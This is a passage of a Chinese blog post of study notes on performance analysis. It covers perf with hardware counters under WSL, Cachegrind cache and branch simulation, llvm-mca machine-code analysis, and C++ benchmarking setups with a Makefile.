<h5 id="硬件事件与性能计数器"><a href="#硬件事件与性能计数器" class="headerlink" title="硬件事件与性能计数器"></a><strong>硬件事件与性能计数器</strong></h5><p><strong>硬件事件</strong>指的是与硬件行为相关的活动，如<strong>分支预测错误</strong>（branch mispredict）、<strong>缓存未命中</strong>（cache miss）等。这些事件在CPU上有对应的<strong>硬件性能计数器</strong>，这些计数器会记录特定硬件事件发生的次数。</p>
<ul>
<li><strong>硬件性能计数器</strong>：这些特殊的寄存器内置于微处理器中，用于存储某些硬件活动的发生次数。它们是非常轻量级的硬件组件，通常只有简单的二进制计数器和相应的激活信号。</li>
<li><strong>事件触发的计数</strong>：每个性能计数器与大量的硬件电路连接，可以配置为在某个硬件事件发生时递增。例如，若程序发生了分支预测错误，或者缓存未命中，计数器就会增加。</li>
<li><strong>事件多路复用</strong>：有时需要同时追踪多个硬件事件，可以通过<strong>多路复用</strong>技术，在不同的时间间隔内切换不同的计数器。虽然这种方法得到的统计是近似的，但它仍然能提供足够的信息用于性能分析。</li>
</ul>
<p>与插桩方法相比，统计分析方法更加轻量，不会在每个函数调用时引入额外的开销，避免了程序执行的显著干扰。通过增加采样频率可以提高分析的准确性，但过高的采样频率可能会引起性能下降，从而影响统计数据的真实性。因此，通常需要较长时间的运行来获得更精确的统计数据。</p>
<h5 id="分析工具"><a href="#分析工具" class="headerlink" title="分析工具"></a>分析工具</h5><p>在linux系统上，主要使用 <strong>perf</strong> 进行分析，而在别的系统上，可以使用 <a class="link"   href="https://software.intel.com/content/www/us/en/develop/tools/oneapi/components/vtune-profiler.html#gs.cuc0ks" >VTune<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 实现类似功能。这里我在wsl环境下进行实验，也可以尝试用<code>sudo apt install linux-tools-common</code>进行安装，但是会一直显示内核环境不匹配。那我们可以去github下载源码手动编译。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install elfutils libunwind-dev libperl-dev liblzma-dev libzstd-dev libcap-dev libnuma-dev libbabeltrace-dev libpfm4-dev libtraceevent-dev </span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/microsoft/WSL2-Linux-Kernel --depth 1</span><br><span class="line"><span class="built_in">cd</span> WSL2-Linux-Kernel/tools/perf</span><br><span class="line">make -j8</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> perf /usr/local/bin</span><br></pre></td></tr></table></figure></div>
<p>然后我们准备一个cpp程序：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// g++ -O3 -march=native ./test.cpp -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;random&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n = <span class="number">10000000</span>;</span><br><span class="line"><span class="type">int</span> a[<span class="number">10000000</span>];</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">binary_search</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="type">int</span> m = (l + r) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (a[m] &gt;= x)</span><br><span class="line">            r = m;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            l = m + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        a[i] = <span class="built_in">rand</span>();</span><br><span class="line">    <span class="built_in">sort</span>(a, a + n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> checksum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> idx = <span class="built_in">binary_search</span>(a, a + n, <span class="built_in">rand</span>());</span><br><span class="line">        checksum += idx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> checksum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(chrono::steady_clock::<span class="built_in">now</span>().<span class="built_in">time_since_epoch</span>().<span class="built_in">count</span>());</span><br><span class="line">    <span class="built_in">setup</span>();</span><br><span class="line">    cout &lt;&lt; <span class="built_in">query</span>() &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后我们可以<code>perf stat ./test</code> 进行测试。但发现如上perf会显示如下错误，能够获取的信息很有限。之后看了<a class="link"   href="https://www.scicoding.com/how-to-perform-perf-profiling-in-wsl2/" >这篇文章<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>发现可能wsl2就是不支持硬件计数器的，所以最好我们还是用vm中的完整linux系统来进行模拟。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/image-20250313195628873.png"
                      class=""
                >
<p>有时候会出现如下错误：</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">Error:</span><br><span class="line">Access to performance monitoring and observability operations is limited.</span><br><span class="line">Consider adjusting /proc/sys/kernel/perf_event_paranoid setting to open</span><br><span class="line">access to performance monitoring and observability operations for processes</span><br><span class="line">without CAP_PERFMON, CAP_SYS_PTRACE or CAP_SYS_ADMIN Linux capability.</span><br><span class="line">More information can be found at &#x27;Perf events and tool security&#x27; document:</span><br><span class="line">https://www.kernel.org/doc/html/latest/admin-guide/perf-security.html</span><br><span class="line">perf_event_paranoid setting is 4:</span><br><span class="line">  -1: Allow use of (almost) all events by all users</span><br><span class="line">      Ignore mlock limit after perf_event_mlock_kb without CAP_IPC_LOCK</span><br><span class="line">&gt;= 0: Disallow raw and ftrace function tracepoint access</span><br><span class="line">&gt;= 1: Disallow CPU event access</span><br><span class="line">&gt;= 2: Disallow kernel profiling</span><br><span class="line">To make the adjusted perf_event_paranoid setting permanent preserve it</span><br><span class="line">in /etc/sysctl.conf (e.g. kernel.perf_event_paranoid = &lt;setting&gt;)</span><br></pre></td></tr></table></figure></div>
<p>这是因为 <code>perf_event_paranoid</code> 级别过高，限制了非特权用户的访问。我们可以降低 <code>perf_event_paranoid</code> 级别来解决这个问题。</p>
<p><strong>1. 临时调整权限（仅对当前会话有效）</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -1 | <span class="built_in">sudo</span> <span class="built_in">tee</span> /proc/sys/kernel/perf_event_paranoid</span><br></pre></td></tr></table></figure></div>
<p>解释：</p>
<ul>
<li><code>-1</code> 允许所有用户访问几乎所有性能事件。</li>
<li>该设置 <strong>仅对当前会话有效</strong>，重启后会恢复默认值。</li>
</ul>
<p><strong>2. 永久修改 <code>perf_event_paranoid</code> 设置</strong></p>
<p>如果你希望每次启动系统时 <code>perf</code> 都能正常工作，可以修改 <strong><code>/etc/sysctl.conf</code></strong>：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;kernel.perf_event_paranoid = -1&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> -a /etc/sysctl.conf</span><br><span class="line"><span class="built_in">sudo</span> sysctl -p  <span class="comment"># 立即生效</span></span><br></pre></td></tr></table></figure></div>
<p>这样每次重启后，<code>perf_event_paranoid</code> 都会自动设置为 <code>-1</code>。</p>
<p>正常的执行结果如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/image-20250313203855345.png"
                      class=""
                >
<p>还可以用<code>perf stat -e cache-references,cache-misses ./test</code>来查看缓存的引用数以及不命中率。更多的可查看的事件可以通过<code>perf list</code>列出来。常用的还有<code>perf record -g binary</code>记录数据，<code>perf report</code>查看数据。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/image-20250313210543942.png"
                      class=""
                >
<p>还能够跟进具体的函数查看哪个指令花费的时间最多。从下图可发现我们的程序大部分时间都在等待比较结果并跳转。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/image-20250313210218141.png"
                      class=""
                >
<h4 id="程序模拟（Program-Simulation）"><a href="#程序模拟（Program-Simulation）" class="headerlink" title="程序模拟（Program Simulation）"></a>程序模拟（Program Simulation）</h4><p>这类分析工具有许多不同的子类别，它们在模拟计算的不同方面有所区别。我们将重点关注<strong>缓存（caching）</strong>和<strong>分支预测（branch prediction）</strong>，并使用 <strong>Cachegrind</strong> 进行分析。Cachegrind 是 <strong>Valgrind</strong> 的一个专门用于性能分析的组件，而 <strong>Valgrind</strong> 本身是一个广泛用于<strong>内存泄漏检测</strong>和<strong>内存调试</strong>的工具。我们可以通过这个工具清晰的看出缓存的命中率以及分支预测成功率。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/image-20250313212257762.png"
                      class=""
                >
<p><code>Cachegrind</code> 只模拟了第一个（D1 数据缓存，I1 指令缓存）和最后一个（LL，统一缓存）级别的缓存，这些特性是从系统中推断出来的。它并不限制你使用，可以通过命令行设置它们，例如，要模拟 <strong>L2 缓存</strong>，可以使用：<code>--LL=&lt;size&gt;,&lt;associativity&gt;,&lt;line size&gt;</code>。</p>
<p>到目前为止，似乎它只是让程序变慢了，并没有提供比 <code>perf stat</code> 更多的信息。为了从中获得更多信息，我们可以检查它默认输出的包含分析信息的特殊文件，该文件通常会以 <code>cachegrind.out.&lt;pid&gt;</code> 的形式保存在同一目录中。它是可读的，但应该通过 <code>cg_annotate</code> 命令来读取：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">cg_annotate cachegrind.out.4159404 --show=Dr,D1mr,DLmr,Bc,Bcm</span><br></pre></td></tr></table></figure></div>
<p><code>Dr</code> 代表数据读取，<code>D1mr</code> 代表 D1 缓存未命中，<code>DLmr</code> 代表 LL 缓存未命中，<code>Bc</code> 代表分支计数，<code>Bcm</code> 代表分支误预测计数。</p>
<p>首先会展示出缓存系统的一些参数：</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">I1 cache:         32768 B, 64 B, 8-way associative</span><br><span class="line">D1 cache:         49152 B, 64 B, 12-way associative</span><br><span class="line">LL cache:         25165824 B, 64 B, 12-way associative</span><br></pre></td></tr></table></figure></div>
<p>接下来，它会输出一个类似 <code>perf report</code> 的每个函数的摘要：</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">Dr                   D1mr                 DLmr               Bc                   Bcm                   file:function</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">233,222,628 (24.19%) 120,907,934 (93.42%) 9,088,287 (88.93%) 476,445,256 (46.38%) 126,804,147 (55.30%)  /usr/include/c++/11/bits/stl_algobase.h:query()</span><br><span class="line">  2,974,063 ( 0.31%)         545 ( 0.00%)         1 ( 0.00%) 294,308,292 (28.65%)  90,370,039 (39.41%)  /usr/include/c++/11/bits/stl_algo.h:void std::__introsort_loop&lt;int*, long, __gnu_cxx::__ops::_Iter_less_iter&gt;(int*, int*, long, __gnu_cxx::__ops::_Iter_less_iter) [clone .isra.0]</span><br><span class="line">160,000,000 (16.59%)          30 ( 0.00%)        22 ( 0.00%)  99,354,839 ( 9.67%)   1,290,334 ( 0.56%)  ./stdlib/./stdlib/random_r.c:random_r</span><br><span class="line">160,000,000 (16.59%)           2 ( 0.00%)         2 ( 0.00%)  80,000,000 ( 7.79%)           3 ( 0.00%)  ./stdlib/./stdlib/random.c:random</span><br><span class="line">290,352,982 (30.11%)   7,876,199 ( 6.09%)   890,954 ( 8.72%)           0                    0           /usr/include/c++/11/bits/predefined_ops.h:void std::__introsort_loop&lt;int*, long, __gnu_cxx::__ops::_Iter_less_iter&gt;(int*, int*, long, __gnu_cxx::__ops::_Iter_less_iter) [clone .isra.0]</span><br><span class="line">          0                    0                  0                    0                    0           /usr/include/c++/11/bits/stl_iterator_base_funcs.h:query()</span><br><span class="line">  9,999,999 ( 1.04%)     624,243 ( 0.48%)   231,812 ( 2.27%)  46,870,617 ( 4.56%)  10,811,473 ( 4.72%)  /usr/include/c++/11/bits/stl_algo.h:setup()</span><br><span class="line"> 20,000,004 ( 2.07%)           2 ( 0.00%)         2 ( 0.00%)  10,000,001 ( 0.97%)           9 ( 0.00%)  /mnt/d/code/C++/./test.cpp:query()</span><br><span class="line"> 20,000,000 ( 2.07%)           0                  0                    0                    0           ./stdlib/./stdlib/rand.c:rand</span><br><span class="line">          0                    0                  0                    0                    0           /usr/include/c++/11/bits/move.h:void std::__introsort_loop&lt;int*, long, __gnu_cxx::__ops::_Iter_less_iter&gt;(int*, int*, long, __gnu_cxx::__ops::_Iter_less_iter) [clone .isra.0]</span><br><span class="line"> 10,000,008 ( 1.04%)           3 ( 0.00%)         2 ( 0.00%)  10,000,001 ( 0.97%)           7 ( 0.00%)  /mnt/d/code/C++/./test.cpp:setup()</span><br><span class="line"> 36,870,615 ( 3.82%)           0                  0                    0                    0           /usr/include/c++/11/bits/predefined_ops.h:setup()</span><br><span class="line"> 20,001,490 ( 2.07%)         155 ( 0.00%)        45 ( 0.00%)         162 ( 0.00%)          46 ( 0.00%)  ???:???</span><br><span class="line">          0                    0                  0           10,000,000 ( 0.97%)           3 ( 0.00%)  /usr/include/c++/11/bits/stl_algo.h:query()</span><br></pre></td></tr></table></figure></div>
<p>这样我们就可以分析是在什么阶段出了很多 <strong>L1 缓存未命中</strong> 和 <strong>分支误预测</strong>。这是<strong>perf</strong>不具有的功能。</p>
<p><code>Cachegrind</code> 还有一个非常好的特性是对源代码的逐行注解。为此，你需要用调试信息（<code>-g</code>）编译程序，并且显式告诉 <code>cg_annotate</code> 需要注解哪些源文件，或者直接使用 <code>--auto=yes</code> 选项，让它自动注解所有它能访问到的文件（包括标准库的源代码）。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">g++ -O3 -march=native ./test.cpp -g -o <span class="built_in">test</span></span><br><span class="line">valgrind --tool=cachegrind --branch-sim=<span class="built_in">yes</span> --cachegrind-out-file=cachegrind.out ./test</span><br><span class="line">cg_annotate cachegrind.out --auto=<span class="built_in">yes</span> --show=Dr,D1mr,DLmr,Bc,Bcm</span><br></pre></td></tr></table></figure></div>
<p>不幸的是，<code>Cachegrind</code> 只追踪内存访问和分支。当瓶颈是由其他因素引起时，我们需要使用其他模拟工具进行分析。</p>
<h4 id="机器码分析"><a href="#机器码分析" class="headerlink" title="机器码分析"></a>机器码分析</h4><p>主要用的工具是<code>llvm-mca</code>，我们将以数组求和作为简单的例子进行分析：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">loop:</span><br><span class="line">    addl (%rax), %edx</span><br><span class="line">    addq $4, %rax</span><br><span class="line">    cmpq %rcx, %rax</span><br><span class="line">    jne loop</span><br></pre></td></tr></table></figure></div>
<p><strong>llvm-mca 的分析结果（以 Skylake 微架构为例）</strong></p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">Iterations:        100</span><br><span class="line">Instructions:      400</span><br><span class="line">Total Cycles:      108</span><br><span class="line">Total uOps:        500</span><br><span class="line"></span><br><span class="line">Dispatch Width:    6</span><br><span class="line">uOps Per Cycle:    4.63</span><br><span class="line">IPC:               3.70</span><br><span class="line">Block RThroughput: 0.8</span><br></pre></td></tr></table></figure></div>
<p><strong>运行信息：</strong></p>
<ul>
<li><code>llvm-mca</code> 模拟执行了 100 次循环，总共执行了 400 条指令，用时 108 个周期。</li>
<li>这相当于每个周期平均执行约 3.7 条指令（IPC，即每周期指令数）。</li>
<li>CPU 理论上每周期最多执行 6 条指令（调度宽度）。</li>
<li>每条指令的平均吞吐量为 0.8 周期。</li>
</ul>
<p><strong>指令信息：</strong></p>
<ul>
<li>每条指令的细节信息，包括它分解成的微操作数（uOps）、延迟、吞吐量等：</li>
</ul>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">[1]    [2]    [3]    [4]    [5]    [6]    Instructions:</span><br><span class="line">2      6     0.50    *                   addl    (%rax), %edx</span><br><span class="line">1      1     0.25                        addq    $4, %rax</span><br><span class="line">1      1     0.25                        cmpq    %rcx, %rax</span><br><span class="line">1      1     0.50                        jne     -11</span><br></pre></td></tr></table></figure></div>
<p>每条指令有：</p>
<ul>
<li><strong>uOps</strong>：指令分解成的微操作数。</li>
<li><strong>延迟</strong>：执行该指令所需的周期数。</li>
<li><strong>吞吐量</strong>：指令在多个副本可以同时执行时的平均周期数。</li>
</ul>
<ol>
<li><strong>资源压力图：</strong> <code>llvm-mca</code> 还会输出每条指令使用的CPU资源的压力情况。如下所示：</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Resource pressure by instruction:</span><br><span class="line">[0]    [1]    [2]    [3]    [4]    [5]    [6]    [7]    [8]    [9]    Instructions:</span><br><span class="line">-      -     0.01   0.98   0.50   0.50    -      -     0.01    -     addl (%rax), %edx</span><br><span class="line">-      -      -      -      -      -      -     0.01   0.99    -     addq $4, %rax</span><br><span class="line">-      -      -     0.01    -      -      -     0.99    -      -     cmpq %rcx, %rax</span><br><span class="line">-      -     0.99    -      -      -      -      -     0.01    -     jne -11</span><br></pre></td></tr></table></figure></div>
<ul>
<li>该图显示了每条指令在不同执行端口上的资源使用情况。</li>
<li>通过查看这些统计信息，可以诊断出哪些指令在执行过程中遇到了瓶颈，通常是由于资源争用导致的结构性危害。</li>
</ul>
<h4 id="基准测试"><a href="#基准测试" class="headerlink" title="基准测试"></a>基准测试</h4><p>在软件工程中，大多数优秀的实践都涉及到如何缩短开发周期：你希望更快地编译软件（构建系统）、尽早捕获错误（静态分析、持续集成）、一有新版本就立即发布（持续部署），并且快速响应用户反馈（敏捷开发）。性能工程也是如此。如果做得正确，它应该类似于一个循环：</p>
<ol>
<li>运行程序并收集度量指标。</li>
<li>找出瓶颈所在。</li>
<li>消除瓶颈，回到第 1 步。</li>
</ol>
<p>编写基准测试代码有几种方法。可能最常见的方法是将要比较的多种同语言实现放在同一个文件中，在 <code>main</code> 函数中分别调用它们，并在同一个源文件中计算你想要的所有度量指标。</p>
<p>这种方法的缺点是你需要编写大量的样板代码，并且为每个实现重复这些代码，但可以通过元编程来部分消除这一点。例如，当你正在基准测试多个 <code>gcd</code> 实现时，可以通过这个高阶函数大大减少基准测试代码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span>, T = <span class="number">1e9</span> / N;</span><br><span class="line"><span class="type">int</span> a[N], b[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">timeit</span><span class="params">(<span class="type">int</span> (*f)(<span class="type">int</span>, <span class="type">int</span>))</span> </span>&#123;</span><br><span class="line">    <span class="type">clock_t</span> start = <span class="built_in">clock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> checksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> t = <span class="number">0</span>; t &lt; T; t++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">            checksum ^= <span class="built_in">f</span>(a[i], b[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="type">float</span> seconds = <span class="built_in">float</span>(<span class="built_in">clock</span>() - start) / CLOCKS_PER_SEC;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;checksum: %d\n&quot;</span>, checksum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2f ns per call\n&quot;</span>, <span class="number">1e9</span> * seconds / N / T);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">        a[i] = <span class="built_in">rand</span>(), b[i] = <span class="built_in">rand</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">timeit</span>(std::gcd);</span><br><span class="line">    <span class="built_in">timeit</span>(my_gcd);</span><br><span class="line">    <span class="built_in">timeit</span>(my_another_gcd);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这种方法具有非常低的开销，可以让你运行更多的实验并从中获得更准确的结果。你仍然需要执行一些重复的操作，但它们可以通过框架自动化，Google 的 <code>benchmark</code> 库是 C++ 中最流行的选择。一些编程语言也提供了方便的内置基准工具，例如 Python 的 <code>timeit</code> 函数和 Julia 的 <code>@benchmark</code> 宏。</p>
<h5 id="分离实现代码"><a href="#分离实现代码" class="headerlink" title="分离实现代码"></a>分离实现代码</h5><p>在 C/C++ 中，通常可以通过创建一个单一的头文件（例如 <code>gcd.hh</code>）来定义算法接口，并将所有的基准测试代码放在 <code>main</code> 函数中。这种做法的基本结构如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcd.hh</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>; <span class="comment">// 需要实现</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gcd.hh&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span>, T = <span class="number">1e9</span> / N;</span><br><span class="line">    <span class="type">int</span> a[N], b[N];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">        a[i] = <span class="built_in">rand</span>(), b[i] = <span class="built_in">rand</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> checksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">clock_t</span> start = <span class="built_in">clock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> t = <span class="number">0</span>; t &lt; T; t++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">            checksum += <span class="built_in">gcd</span>(a[i], b[i]);</span><br><span class="line"></span><br><span class="line">    <span class="type">float</span> seconds = <span class="built_in">float</span>(<span class="built_in">clock</span>() - start) / CLOCKS_PER_SEC;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, checksum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2f ns per call\n&quot;</span>, <span class="number">1e9</span> * seconds / N / T);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在上面的代码中，<code>gcd.hh</code> 头文件只声明了 <code>gcd</code> 函数，而其具体实现被写在不同的源文件中。这样可以让你在不修改主代码的情况下，测试不同版本的 <code>gcd</code> 算法。</p>
<p><strong>不同版本的实现</strong></p>
<p>每个算法版本的实现（例如，<code>v1.cc</code>、<code>v2.cc</code> 等）都可以包含这个头文件，并根据需要实现 <code>gcd</code> 函数。例如：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// v1.cc</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gcd.hh&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">gcd</span>(b, a % b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这种方法使得你可以在命令行中指定某个版本的算法进行基准测试，而无需修改任何源代码。你只需在不同的实现文件之间切换或通过编译时参数选择实现版本。</p>
<p><strong>动态调整参数</strong></p>
<p>为了提高灵活性，可以通过命令行参数来传递运行时的参数。例如，你可以根据命令行参数设置数据集大小：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> N = (argc &gt; <span class="number">1</span> ? <span class="built_in">atoi</span>(argv[<span class="number">1</span>]) : <span class="number">1e6</span>);  <span class="comment">// 通过命令行参数设置 N 的值</span></span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> T = <span class="number">1e9</span> / N;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 基准测试代码...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这样，你就能够在不同的实验中灵活地调整输入数据的规模而无需重新编写代码。</p>
<p><strong>使用编译时常量</strong></p>
<p>另一种方法是使用 C 风格的全局宏定义，并通过编译时的 <code>-D</code> 标志来传递参数。例如，设置 <code>N</code> 的值：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">// gcd.hh</span><br><span class="line"><span class="comment">#ifndef N</span></span><br><span class="line"><span class="comment">#define N 1000000</span></span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"></span><br><span class="line">const int T = 1e9 / N;</span><br></pre></td></tr></table></figure></div>
<p>然后在编译时使用 <code>-D N=2000000</code> 来设置 <code>N</code> 的值：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">g++ -D N=2000000 -o main main.cpp v1.cc</span><br></pre></td></tr></table></figure></div>
<p>这种方法的优势是能够利用编译时常量，这对于某些算法的性能优化非常有帮助。然而，缺点是每次更改参数时需要重新编译程序，这可能会增加收集多个参数值的度量数据所需的时间。</p>
<h5 id="Makefile使用"><a href="#Makefile使用" class="headerlink" title="Makefile使用"></a>Makefile使用</h5><p>为了提高编译速度，可以将源文件拆分，并使用像Make这样的缓存构建系统。Make是一个强大的工具，可以通过自动化编译过程来加速构建和测试循环。以下是一个常用的Makefile示例，适用于C++项目的构建：</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line">compile = g++ -std=c++17 -O3 -march=native -Wall</span><br><span class="line"></span><br><span class="line"><span class="section">%: %.cc gcd.hh</span></span><br><span class="line">	<span class="variable">$(compile)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span> </span><br><span class="line"></span><br><span class="line"><span class="section">%.s: %.cc gcd.hh</span></span><br><span class="line">	<span class="variable">$(compile)</span> -S -fverbose-asm <span class="variable">$&lt;</span> -o <span class="variable">$@</span>  <span class="comment"># 生成汇编文件</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.run: %  # 运行文件</span></span><br><span class="line">	@./<span class="variable">$&lt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span 